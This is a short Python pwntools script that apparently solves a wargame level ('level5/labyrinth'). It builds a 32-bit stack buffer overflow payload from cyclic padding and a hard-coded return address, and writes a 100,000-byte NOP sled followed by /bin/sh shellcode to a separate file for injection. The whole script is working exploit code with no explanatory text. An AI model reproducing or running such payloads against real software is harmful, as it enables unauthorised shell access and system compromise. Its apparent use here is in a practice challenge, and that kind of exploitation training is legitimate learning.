#! /usr/bin/env python3

from pwn import *

context(arch='i386', os='linux', endian='little') # Context of target binary

avg_addr = p32(0xffa41fb8)
sled_size = 100000
offset = cyclic_find(b'raaf')

padding = cyclic(offset)

shell = asm(shellcraft.sh())
nop_sled = asm(shellcraft.nop()) * sled_size

overflow_payload = padding + avg_addr
shellcode_env = nop_sled + shell

with open("level5/labyrinth", "wb") as fl:
    fl.write(overflow_payload)

with open("shellcode.32", "wb") as fl:
    fl.write(shellcode_env)